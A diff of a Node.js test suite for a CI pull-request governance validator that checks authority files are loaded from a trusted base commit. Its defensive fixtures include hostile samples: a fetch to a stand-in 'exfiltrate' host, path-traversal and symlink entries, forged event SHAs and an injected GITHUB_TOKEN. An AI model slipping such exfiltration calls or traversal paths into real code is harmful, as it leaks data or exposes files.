@@ -7,293 +7,264 @@ import { dirname, join } from "node:path";
 import test from "node:test";
 
 import {
-  runBaseOnlySimulation,
+  CANONICAL_AUTHORITY_PATHS,
   runBaseOnlyGitSimulation,
-  sha256,
+  runBaseOnlySimulation,
+  verifyMaterializedAuthoritySnapshot,
 } from "../../scripts/governance/validate-f2-gov-08.mjs";
 
 const root = new URL("../../", import.meta.url);
-const contract = JSON.parse(readFileSync(new URL("fixtures/audit/f2-gov-08-base-only-contract.json", root), "utf8"));
-const matrix = [
-  { engine: "chromium", route: "index.html", viewport: [390, 844], action: "open-drawer" },
-  { engine: "firefox", route: "index.html", viewport: [390, 844], action: "escape-close" },
-  { engine: "webkit", route: "index.html", viewport: [1024, 768], action: "focus-navigation" },
-  { engine: "chromium", route: "politica-privacidade.html", viewport: [360, 800], action: "open-drawer" },
-];
-const expectations = [
-  { semanticResult: "PASS", raw: { complete: true, drawerOpen: true, focusInside: true, targetWidth: 44, targetHeight: 44 } },
-  { semanticResult: "PASS", raw: { complete: true, drawerOpen: false, focusInside: false, targetWidth: 44, targetHeight: 44 } },
-  { semanticResult: "PASS", raw: { complete: true, drawerOpen: false, focusInside: true, targetWidth: 48, targetHeight: 48 } },
-  { semanticResult: "PASS", raw: { complete: true, drawerOpen: true, focusInside: true, targetWidth: 44, targetHeight: 44 } },
-];
-const authorityFiles = [
-  { path: "trusted/consumer.mjs", mode: "100644", type: "blob", bytes: "export const authority = base-only-consumer-v1;\n" },
-  { path: "trusted/matrix.json", mode: "100644", type: "blob", bytes: JSON.stringify(matrix) },
-  { path: "trusted/expectations.json", mode: "100644", type: "blob", bytes: JSON.stringify(expectations) },
-  { path: "trusted/static-server.mjs", mode: "100644", type: "blob", bytes: "export const server = isolated-loopback-v1;\n" },
-];
-const candidateEntries = [
-  { path: "index.html", mode: "100644", type: "blob", filesystemType: "file", bytes: "<!doctype html><title>candidate</title>" },
-  { path: "politica-privacidade.html", mode: "100644", type: "blob", filesystemType: "file", bytes: "<!doctype html><title>privacy</title>" },
-  { path: "src/css/branct.css", mode: "100644", type: "blob", filesystemType: "file", bytes: ".menu{display:block}" },
-  { path: "src/js/branct.js", mode: "100644", type: "blob", filesystemType: "file", bytes: "document.documentElement.dataset.ready='true';" },
-];
+const canonicalPaths = Object.values(CANONICAL_AUTHORITY_PATHS);
+const html = (title, width = 44, height = 44) => `<!doctype html><html data-drawer-capable="true" data-focus-capable="true" data-target-width="${width}" data-target-height="${height}" data-focus-target-width="48" data-focus-target-height="48"><title>${title}</title></html>`;
 
-const clone = (value) => structuredClone(value);
-const tupleKey = ({ engine, route, viewport, action }) => JSON.stringify([engine, route, viewport, action]);
-const expectedByTuple = new Map(matrix.map((entry, index) => [tupleKey(entry), expectations[index].raw]));
-
-function validInput() {
-  return {
-    contract: clone(contract),
-    baseSha: contract.simulation.baseSha,
-    headSha: contract.simulation.headSha,
-    authorityFiles: clone(authorityFiles),
-    candidateEntries: clone(candidateEntries),
-    origin: contract.simulation.origin,
-    environment: {},
-    networkRequests: matrix.map(() => `${contract.simulation.origin}/index.html`),
-    readRaw: (canonicalCase) => clone(expectedByTuple.get(tupleKey(canonicalCase))),
-  };
+async function write(repository, path, bytes) {
+  const target = join(repository, ...path.split("/"));
+  await mkdir(dirname(target), { recursive: true });
+  await writeFile(target, bytes);
 }
 
-function mutateAuthority(input, role, mutate, { updateDigest = false } = {}) {
-  const pin = input.contract.authority.files.find((entry) => entry.role === role);
-  const file = input.authorityFiles.find((entry) => entry.path === pin.path);
-  mutate(file, pin);
-  if (updateDigest) pin.sha256 = sha256(file.bytes);
-}
-
-test("F2-GOV-08 accepts one complete legitimate base-only measurement", () => {
-  const result = runBaseOnlySimulation(validInput());
-  assert.equal(result.decision, "PASS");
-  assert.equal(result.evidence.length, matrix.length);
-  assert.equal(new Set(result.evidence.map(({ identity }) => identity)).size, matrix.length);
-  assert.ok(result.evidence.every(({ digest, semanticResult }) => /^[0-9a-f]{64}$/.test(digest) && semanticResult === "PASS"));
-  assert.equal(result.authority.baseSha, contract.simulation.baseSha);
-  assert.equal(result.authority.headSha, contract.simulation.headSha);
-});
-
-test("F2-GOV-08 rejects OBSERVATION_PAYLOAD_SWAP", () => {
-  const input = validInput();
-  input.readRaw = (canonicalCase) => clone(expectations[(matrix.findIndex((entry) => tupleKey(entry) === tupleKey(canonicalCase)) + 1) % matrix.length].raw);
-  assert.throws(() => runBaseOnlySimulation(input), /OBSERVATION_PAYLOAD_SWAP|semantic expectation differs/i);
-});
-
-test("F2-GOV-08 rejects KEYED_PRODUCER_TRANSPLANT", () => {
-  const input = validInput();
-  input.readRaw = (canonicalCase) => ({ ...clone(expectedByTuple.get(tupleKey(canonicalCase))), key: "producer-key", digest: "0".repeat(64) });
-  assert.throws(() => runBaseOnlySimulation(input), /KEYED_PRODUCER_TRANSPLANT|producer-forbidden field/i);
-});
-
-for (const [label, transform, expected] of [
-  ["simple result swap", (input) => { input.readRaw = (c) => clone(expectations[(matrix.findIndex((entry) => tupleKey(entry) === tupleKey(c)) + 1) % 2].raw); }, /semantic expectation differs/i],
-  ["circular result swap", (input) => { input.readRaw = (c) => clone(expectations[(matrix.findIndex((entry) => tupleKey(entry) === tupleKey(c)) + 1) % matrix.length].raw); }, /semantic expectation differs/i],
-  ["copied result", (input) => { input.readRaw = () => clone(expectations[0].raw); }, /semantic expectation differs/i],
-  ["omitted result", (input) => { input.readRaw = (c) => tupleKey(c) === tupleKey(matrix[2]) ? undefined : clone(expectedByTuple.get(tupleKey(c))); }, /raw observation.*absent|incomplete/i],
-  ["partial report", (input) => { input.readRaw = (c) => { const raw = clone(expectedByTuple.get(tupleKey(c))); delete raw.targetHeight; return raw; }; }, /raw observation schema.*incomplete|exact/i],
-  ["content identity claim", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), identity: "forged" }); }, /producer-forbidden field.*identity/i],
-  ["content envelope claim", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), envelope: {} }); }, /producer-forbidden field.*envelope/i],
-  ["content digest claim", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), digest: "0".repeat(64) }); }, /producer-forbidden field.*digest/i],
-  ["content semantic result claim", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), semanticResult: "PASS" }); }, /producer-forbidden field.*semanticResult/i],
-  ["content PASS claim", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), pass: true }); }, /producer-forbidden field.*pass/i],
-  ["route supplied by content", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), route: c.route }); }, /producer-forbidden field.*route/i],
-  ["viewport supplied by content", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), viewport: c.viewport }); }, /producer-forbidden field.*viewport/i],
-  ["engine supplied by content", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), engine: c.engine }); }, /producer-forbidden field.*engine/i],
-  ["action supplied by content", (input) => { input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), action: c.action }); }, /producer-forbidden field.*action/i],
-]) {
-  test(`F2-GOV-08 rejects ${label}`, () => {
-    const input = validInput();
-    transform(input);
-    assert.throws(() => runBaseOnlySimulation(input), expected);
-  });
-}
-
-for (const [label, transform, expected] of [
-  ["base SHA drift", (input) => { input.baseSha = "3".repeat(40); }, /base SHA.*divergent/i],
-  ["head SHA drift", (input) => { input.headSha = "4".repeat(40); }, /head SHA.*divergent/i],
-  ["malformed base SHA", (input) => { input.baseSha = "main"; }, /base SHA.*malformed/i],
-  ["consumer alteration", (input) => mutateAuthority(input, "consumer", (file) => { file.bytes += "tampered"; }), /consumer.*digest/i],
-  ["matrix alteration", (input) => mutateAuthority(input, "matrix", (file) => { file.bytes = file.bytes.replace("index.html", "forged.html"); }), /matrix.*digest/i],
-  ["expectation alteration", (input) => mutateAuthority(input, "expectations", (file) => { file.bytes = file.bytes.replace("44", "43"); }), /expectations.*digest/i],
-  ["static server alteration", (input) => mutateAuthority(input, "static-server", (file) => { file.bytes += "tampered"; }), /static-server.*digest/i],
-  ["matrix duplicate with recomputed attacker digest", (input) => { mutateAuthority(input, "matrix", (file) => { const value = JSON.parse(file.bytes); value[1] = clone(value[0]); file.bytes = JSON.stringify(value); }, { updateDigest: true }); input.contract.authority.setSha256 = sha256(JSON.stringify(input.contract.authority.files)); }, /canonical matrix.*duplicate/i],
-  ["matrix route swapped with recomputed attacker digest", (input) => mutateAuthority(input, "matrix", (file) => { const value = JSON.parse(file.bytes); [value[0].route, value[3].route] = [value[3].route, value[0].route]; file.bytes = JSON.stringify(value); }, { updateDigest: true }), /authority digest set|contract digest|matrix.*expectation/i],
-]) {
-  test(`F2-GOV-08 fails closed for ${label}`, () => {
-    const input = validInput();
-    transform(input);
-    assert.throws(() => runBaseOnlySimulation(input), expected);
-  });
-}
-
-for (const [label, entry, expected] of [
-  ["symlink", { path: "src/css/link.css", mode: "120000", type: "blob", bytes: "../../secret" }, /symlink|mode 120000|unexpected Git mode/i],
-  ["submodule", { path: "src/js/vendor", mode: "160000", type: "commit", bytes: "" }, /submodule|unexpected Git (mode|type)/i],
-  ["executable blob", { path: "src/js/run.js", mode: "100755", type: "blob", bytes: "echo unsafe" }, /unexpected Git mode/i],
-  ["path traversal", { path: "src/css/../../secret.txt", mode: "100644", type: "blob", bytes: "secret" }, /path traversal|unsafe candidate path/i],
-  ["absolute path", { path: "/tmp/secret.txt", mode: "100644", type: "blob", bytes: "secret" }, /absolute|unsafe candidate path/i],
-  ["backslash path", { path: "src\\css\\branct.css", mode: "100644", type: "blob", bytes: "bad" }, /backslash|unsafe candidate path/i],
-  ["outside allowlist", { path: "scripts/evil.mjs", mode: "100644", type: "blob", bytes: "bad" }, /outside.*allowlist/i],
-  ["excluded video", { path: "src/img/video.mp4", mode: "100644", type: "blob", bytes: "bad" }, /excluded|outside.*allowlist/i],
-]) {
-  test(`F2-GOV-08 rejects candidate ${label}`, () => {
-    const input = validInput();
-    input.candidateEntries.push({ filesystemType: "file", ...entry });
-    assert.throws(() => runBaseOnlySimulation(input), expected);
-  });
-}
-
-test("F2-GOV-08 rejects a materialized junction or reparse point", () => {
-  const input = validInput();
-  input.candidateEntries[2].filesystemType = "junction";
-  assert.throws(() => runBaseOnlySimulation(input), /junction|reparse|filesystem type/i);
-});
-
-test("F2-GOV-08 rejects a required canonical route omitted from the candidate", () => {
-  const input = validInput();
-  input.candidateEntries = input.candidateEntries.filter(({ path }) => path !== "politica-privacidade.html");
-  assert.throws(() => runBaseOnlySimulation(input), /canonical route.*absent/i);
-});
-
-test("F2-GOV-08 rejects a duplicate candidate path", () => {
-  const input = validInput();
-  input.candidateEntries.push(clone(input.candidateEntries[0]));
-  assert.throws(() => runBaseOnlySimulation(input), /duplicate candidate path/i);
-});
-
-test("F2-GOV-08 rejects every external network request", () => {
-  const input = validInput();
-  input.networkRequests.push("https://example.com/tracker.gif");
-  assert.throws(() => runBaseOnlySimulation(input), /external network.*example\.com/i);
-});
-
-test("F2-GOV-08 rejects a second loopback port", () => {
-  const input = validInput();
-  input.networkRequests.push("http://127.0.0.1:9999/probe");
-  assert.throws(() => runBaseOnlySimulation(input), /network origin.*divergent/i);
-});
-
-test("F2-GOV-08 rejects an inconclusive raw observation", () => {
-  const input = validInput();
-  input.readRaw = (c) => ({ ...clone(expectedByTuple.get(tupleKey(c))), complete: false });
-  assert.throws(() => runBaseOnlySimulation(input), /inconclusive|complete/i);
-});
-
-test("F2-GOV-08 exposes no token or secret to the trusted server and browser", () => {
-  const input = validInput();
-  input.environment.GITHUB_TOKEN = "forbidden";
-  assert.throws(() => runBaseOnlySimulation(input), /credential|secret|GITHUB_TOKEN/i);
-});
-
-test("F2-GOV-08 requires the future job permission to remain read-only", () => {
-  const input = validInput();
-  input.contract.environment.futureJobPermissions.contents = "write";
-  assert.throws(() => runBaseOnlySimulation(input), /permissions.*read-only|contents.*read/i);
-});
-
-test("F2-GOV-08 records simulator limitations without claiming operational enforcement", () => {
-  assert.equal(contract.limitations.workflowEnforcement, "NOT_VERIFIED");
-  assert.equal(contract.limitations.operationalIsolation, "NOT_VERIFIED");
-  assert.equal(contract.limitations.requiresFutureProtectedCeremony, true);
-  assert.equal(contract.status, "OFFLINE_SIMULATOR_ONLY");
-});
-
-async function createGitAuthorityRepository() {
-  const repository = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-git-"));
+async function createRepository() {
+  const repository = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-f1-"));
   const git = (...args) => execFileSync("git", args, { cwd: repository, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
-  git("init", "--quiet");
+  git("init", "--quiet", "--initial-branch=main");
   git("config", "user.email", "f2-gov-08@example.invalid");
   git("config", "user.name", "F2-GOV-08 fixture");
-  for (const file of [...authorityFiles, ...candidateEntries]) {
-    const path = join(repository, ...file.path.split("/"));
-    await mkdir(dirname(path), { recursive: true });
-    await writeFile(path, file.bytes, "utf8");
-  }
+  for (const path of canonicalPaths) await write(repository, path, readFileSync(new URL(path, root)));
+  await write(repository, "index.html", html("base"));
+  await write(repository, "politica-privacidade.html", html("privacy"));
+  await write(repository, "src/css/branct.css", ".menu{display:block}\n");
+  await write(repository, "src/js/branct.js", "document.documentElement.dataset.ready='true';\n");
   git("add", ".");
-  git("commit", "--quiet", "-m", "trusted base");
+  git("commit", "--quiet", "-m", "trusted base authority");
   const baseSha = git("rev-parse", "HEAD");
-  await writeFile(join(repository, "index.html"), "<!doctype html><title>candidate head</title>", "utf8");
+  git("update-ref", "refs/remotes/origin/main", baseSha);
+  git("checkout", "--quiet", "-b", "candidate");
+  await write(repository, "index.html", html("candidate"));
   git("add", "index.html");
-  git("commit", "--quiet", "-m", "candidate live head");
+  git("commit", "--quiet", "-m", "candidate live change");
   const headSha = git("rev-parse", "HEAD");
-  return { repository, git, baseSha, headSha };
-}
-
-function gitSimulationInput(repository, baseSha, headSha) {
-  return {
-    contract: clone(contract), repository, baseSha, headSha,
-    origin: contract.simulation.origin, environment: {},
-    networkRequests: matrix.map(() => `${contract.simulation.origin}/index.html`),
-    readRaw: (canonicalCase) => clone(expectedByTuple.get(tupleKey(canonicalCase))),
+  git("update-ref", "refs/remotes/origin/candidate", headSha);
+  const eventPath = join(repository, "event.json");
+  const event = {
+    pull_request: {
+      base: { ref: "main", sha: baseSha },
+      head: { ref: "candidate", sha: headSha },
+    },
+    repository: { full_name: "branctstudio-rgb/sitebranct" },
   };
+  await writeFile(eventPath, JSON.stringify(event));
+  return { repository, git, baseSha, headSha, eventPath, event };
 }
 
-test("F2-GOV-08 loads consumer, server, matrix and expectations from exact Git base blobs", async () => {
-  const fixture = await createGitAuthorityRepository();
+const run = (fixture, extra = {}) => runBaseOnlyGitSimulation({ repository: fixture.repository, eventPath: fixture.eventPath, ...extra });
+
+test("F2-GOV-08 legitimate path executes the exact base consumer and produces complete evidence", async () => {
+  const fixture = await createRepository();
   try {
-    const result = runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, fixture.baseSha, fixture.headSha));
+    const result = run(fixture);
     assert.equal(result.decision, "PASS");
     assert.equal(result.authority.baseSha, fixture.baseSha);
-    assert.ok(Object.values(result.authority.origins).every(({ baseSha }) => baseSha === fixture.baseSha));
-    fixture.git("commit", "--allow-empty", "--quiet", "-m", "move HEAD only");
-    assert.equal(runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, fixture.baseSha, fixture.headSha)).decision, "PASS", "moving HEAD must not change explicit base/head authority");
-  } finally {
-    await rm(fixture.repository, { recursive: true, force: true });
-  }
+    assert.equal(result.authority.headSha, fixture.headSha);
+    assert.equal(result.authority.contract.path, CANONICAL_AUTHORITY_PATHS.contract);
+    assert.equal(result.authority.manifest.path, CANONICAL_AUTHORITY_PATHS.manifest);
+    assert.equal(result.authority.origins.consumer.path, CANONICAL_AUTHORITY_PATHS.consumer);
+    assert.equal(result.evidence.length, 4);
+    assert.ok(result.evidence.every(({ semanticResult, digest }) => semanticResult === "PASS" && /^[0-9a-f]{64}$/.test(digest)));
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
 });
 
-test("F2-GOV-08 rejects an authority blob altered in the candidate head", async () => {
-  const fixture = await createGitAuthorityRepository();
+test("F2-GOV-08 removes every caller injection API for authority and result inputs", async (t) => {
+  const fixture = await createRepository();
   try {
-    await writeFile(join(fixture.repository, "trusted", "consumer.mjs"), "tampered candidate consumer\n", "utf8");
-    fixture.git("add", "trusted/consumer.mjs");
-    fixture.git("commit", "--quiet", "-m", "tamper protected consumer");
-    const tamperedHead = fixture.git("rev-parse", "HEAD");
-    assert.throws(() => runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, fixture.baseSha, tamperedHead)), /head changed.*protected authority.*trusted\/consumer/i);
-  } finally {
-    await rm(fixture.repository, { recursive: true, force: true });
-  }
+    for (const [name, value] of [
+      ["contract", {}], ["manifest", {}], ["pins", []], ["matrix", []], ["expectations", []],
+      ["consumer", "alternate"], ["baseSha", fixture.baseSha], ["headSha", fixture.headSha],
+      ["readRaw", () => ({})], ["envelope", {}], ["result", "PASS"],
+    ]) await t.test(name, () => assert.throws(() => run(fixture, { [name]: value }), /trusted harness input schema is not exact/i));
+    assert.throws(() => runBaseOnlySimulation({}), /caller-controlled authority API was removed/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
 });
 
-test("F2-GOV-08 rejects an adulterated or missing authority blob at the selected base", async (t) => {
-  const fixture = await createGitAuthorityRepository();
+test("F2-GOV-08 rejects joint contract and manifest replacement in the producer head", async () => {
+  const fixture = await createRepository();
   try {
-    fixture.git("checkout", "--quiet", "-b", "tampered-base", fixture.baseSha);
-    await writeFile(join(fixture.repository, "trusted", "matrix.json"), JSON.stringify([{ engine: "chromium", route: "forged.html", viewport: [1, 1], action: "forge" }]), "utf8");
-    fixture.git("add", "trusted/matrix.json");
-    fixture.git("commit", "--quiet", "-m", "tampered base matrix");
-    const tamperedBase = fixture.git("rev-parse", "HEAD");
-    await writeFile(join(fixture.repository, "index.html"), "changed from tampered base", "utf8");
+    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.contract, "{}\n");
+    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.manifest, "{}\n");
+    fixture.git("add", CANONICAL_AUTHORITY_PATHS.contract, CANONICAL_AUTHORITY_PATHS.manifest);
+    fixture.git("commit", "--quiet", "-m", "joint authority replacement");
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), /head changed a non-live or protected authority path/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+for (const [label, path, content] of [
+  ["consumer", CANONICAL_AUTHORITY_PATHS.consumer, "process.exit(0);\n"],
+  ["matrix", CANONICAL_AUTHORITY_PATHS.matrix, "[]\n"],
+  ["expectations", CANONICAL_AUTHORITY_PATHS.expectations, "[]\n"],
+  ["static server", CANONICAL_AUTHORITY_PATHS.staticServer, "export default {};\n"],
+]) test(`F2-GOV-08 rejects producer alteration of ${label}`, async () => {
+  const fixture = await createRepository();
+  try {
+    await write(fixture.repository, path, content);
+    fixture.git("add", path);
+    fixture.git("commit", "--quiet", "-m", `alter ${label}`);
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), /head changed a non-live or protected authority path/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 rejects alternate imports in the consumer authority", async () => {
+  const source = readFileSync(new URL(CANONICAL_AUTHORITY_PATHS.consumer, root), "utf8");
+  const localImports = [...source.matchAll(/from\s+["'](\.\/[^"']+)["']/g)].map((match) => match[1]);
+  assert.deepEqual(localImports, ["./f2-gov-08-static-server.mjs"]);
+  assert.doesNotMatch(source, /import\s*\(|require\s*\(/);
+});
+
+test("F2-GOV-08 rejects event base, head, repository and ref transplantation", async (t) => {
+  const fixture = await createRepository();
+  try {
+    const cases = [
+      ["base", (event) => { event.pull_request.base.sha = "1".repeat(40); }, /cannot resolve|base/i],
+      ["head", (event) => { event.pull_request.head.sha = "2".repeat(40); }, /cannot resolve|head/i],
+      ["repository", (event) => { event.repository.full_name = "attacker/fork"; }, /repository is divergent/i],
+      ["base ref", (event) => { event.pull_request.base.ref = "release"; }, /base ref is divergent/i],
+      ["head ref", (event) => { event.pull_request.head.ref = "other"; }, /trusted head ref|cannot resolve.*origin\/other/i],
+    ];
+    for (const [label, mutate, expected] of cases) await t.test(label, async () => {
+      const original = structuredClone(fixture.event);
+      mutate(original);
+      await writeFile(fixture.eventPath, JSON.stringify(original));
+      assert.throws(() => run(fixture), expected);
+    });
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 rejects moved remote refs even when event SHAs remain unchanged", async (t) => {
+  const fixture = await createRepository();
+  try {
+    fixture.git("commit", "--allow-empty", "--quiet", "-m", "untrusted ref movement");
+    const moved = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", moved);
+    await t.test("head ref", () => assert.throws(() => run(fixture), /trusted head ref is divergent/i));
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.git("update-ref", "refs/remotes/origin/main", moved);
+    await t.test("base ref", () => assert.throws(() => run(fixture), /trusted base ref is divergent/i));
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 rejects a non-ancestral operational base", async () => {
+  const fixture = await createRepository();
+  try {
+    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: "unrelated\n", encoding: "utf8" }).trim();
+    const tree = execFileSync("git", ["mktree"], { cwd: fixture.repository, input: `100644 blob ${blob}\tunrelated.txt\n`, encoding: "utf8" }).trim();
+    const unrelated = execFileSync("git", ["commit-tree", tree], { cwd: fixture.repository, input: "unrelated head\n", encoding: "utf8" }).trim();
+    fixture.git("update-ref", "refs/remotes/origin/candidate", unrelated);
+    fixture.event.pull_request.head.sha = unrelated;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), /operational base is not an ancestor/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+for (const [label, mode, bytes, expected] of [
+  ["executable mode", "100755", readFileSync(new URL(CANONICAL_AUTHORITY_PATHS.consumer, root)), /canonical consumer has unexpected Git mode/i],
+  ["symlink mode", "120000", Buffer.from("alternate-consumer.mjs\n"), /canonical consumer has unexpected Git mode/i],
+  ["blob digest", "100644", Buffer.from("process.exit(0);\n"), /canonical consumer (size|digest) is divergent/i],
+]) test(`F2-GOV-08 rejects authority ${label} at the trusted base`, async () => {
+  const fixture = await createRepository();
+  try {
+    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: bytes, encoding: null }).toString().trim();
+    fixture.git("checkout", "--quiet", "main");
+    fixture.git("update-index", "--add", "--cacheinfo", `${mode},${blob},${CANONICAL_AUTHORITY_PATHS.consumer}`);
+    fixture.git("commit", "--quiet", "-m", `authority ${label}`);
+    fixture.baseSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/main", fixture.baseSha);
+    await write(fixture.repository, "index.html", html("candidate over altered base"));
     fixture.git("add", "index.html");
-    fixture.git("commit", "--quiet", "-m", "head over tampered base");
-    const tamperedHead = fixture.git("rev-parse", "HEAD");
-    await t.test("adulterated base blob", () => assert.throws(() => runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, tamperedBase, tamperedHead)), /matrix authority digest is divergent/i));
-
-    fixture.git("checkout", "--quiet", "-b", "missing-base", fixture.baseSha);
-    fixture.git("rm", "--quiet", "trusted/static-server.mjs");
-    fixture.git("commit", "--quiet", "-m", "remove base server");
-    const missingBase = fixture.git("rev-parse", "HEAD");
-    await writeFile(join(fixture.repository, "index.html"), "changed from missing base", "utf8");
-    fixture.git("add", "index.html");
-    fixture.git("commit", "--quiet", "-m", "head over missing base");
-    const missingHead = fixture.git("rev-parse", "HEAD");
-    await t.test("missing base blob", () => assert.throws(() => runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, missingBase, missingHead)), /static-server authority Git blob is absent/i));
-  } finally {
-    await rm(fixture.repository, { recursive: true, force: true });
-  }
+    fixture.git("commit", "--quiet", "-m", "candidate over altered base");
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.base.sha = fixture.baseSha;
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), expected);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
 });
 
-test("F2-GOV-08 rejects non-live candidate changes before measurement", async () => {
-  const fixture = await createGitAuthorityRepository();
+for (const [label, path, content, expected] of [
+  ["unknown path", "unknown/private.txt", "private\n", /non-live|protected authority/i],
+  ["producer command", "scripts/producer.mjs", "process.exit(0);\n", /non-live|protected authority/i],
+  ["producer envelope", "result.json", "{\"decision\":\"PASS\"}\n", /non-live|protected authority/i],
+]) test(`F2-GOV-08 rejects ${label}`, async () => {
+  const fixture = await createRepository();
   try {
-    await mkdir(join(fixture.repository, "scripts"), { recursive: true });
-    await writeFile(join(fixture.repository, "scripts", "producer-command.mjs"), "process.exit(0);\n", "utf8");
-    fixture.git("add", "scripts/producer-command.mjs");
-    fixture.git("commit", "--quiet", "-m", "candidate command");
-    const commandHead = fixture.git("rev-parse", "HEAD");
-    assert.throws(() => runBaseOnlyGitSimulation(gitSimulationInput(fixture.repository, fixture.baseSha, commandHead)), /head changed a non-live.*scripts\/producer-command/i);
-  } finally {
-    await rm(fixture.repository, { recursive: true, force: true });
-  }
+    await write(fixture.repository, path, content);
+    fixture.git("add", path);
+    fixture.git("commit", "--quiet", "-m", label);
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), expected);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 rejects OBSERVATION_PAYLOAD_SWAP measured from a live candidate", async () => {
+  const fixture = await createRepository();
+  try {
+    await write(fixture.repository, "index.html", html("candidate", 43, 44));
+    fixture.git("add", "index.html");
+    fixture.git("commit", "--quiet", "-m", "swap measured payload");
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), /OBSERVATION_PAYLOAD_SWAP/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 actual materialization guard rejects TOCTOU before execution", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-toctou-"));
+  try {
+    const target = join(directory, "consumer.mjs");
+    const bytes = readFileSync(new URL(CANONICAL_AUTHORITY_PATHS.consumer, root));
+    await writeFile(target, bytes);
+    const manifest = JSON.parse(readFileSync(new URL(CANONICAL_AUTHORITY_PATHS.manifest, root), "utf8"));
+    const pin = manifest.files.find(({ role }) => role === "consumer");
+    const files = new Map([["consumer", { bytes, pin }]]);
+    const materialized = new Map([["consumer", target]]);
+    assert.doesNotThrow(() => verifyMaterializedAuthoritySnapshot(files, materialized));
+    await writeFile(target, "process.exit(0);\n");
+    assert.throws(() => verifyMaterializedAuthoritySnapshot(files, materialized), /TOCTOU|size changed after validation/i);
+  } finally { await rm(directory, { recursive: true, force: true }); }
+});
+
+for (const [label, path, content, expected] of [
+  ["external network attempt", "src/js/branct.js", "fetch('https://example.invalid/exfiltrate');\n", /external network intent/i],
+  ["KEYED_PRODUCER_TRANSPLANT", "index.html", `${html("candidate").replace("<html ", "<html data-authority-key=\"producer\" ")}`, /KEYED_PRODUCER_TRANSPLANT/i],
+]) test(`F2-GOV-08 rejects ${label} from candidate content`, async () => {
+  const fixture = await createRepository();
+  try {
+    await write(fixture.repository, path, content);
+    fixture.git("add", path);
+    fixture.git("commit", "--quiet", "-m", label);
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), expected);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-08 records simulator limits instead of claiming workflow enforcement", () => {
+  const contract = JSON.parse(readFileSync(new URL(CANONICAL_AUTHORITY_PATHS.contract, root), "utf8"));
+  assert.equal(contract.limitations.workflowEnforcement, "NOT_VERIFIED");
+  assert.equal(contract.limitations.operationalIsolation, "NOT_VERIFIED");
+  assert.equal(contract.limitations.browserNetworkIsolation, "NOT_VERIFIED");
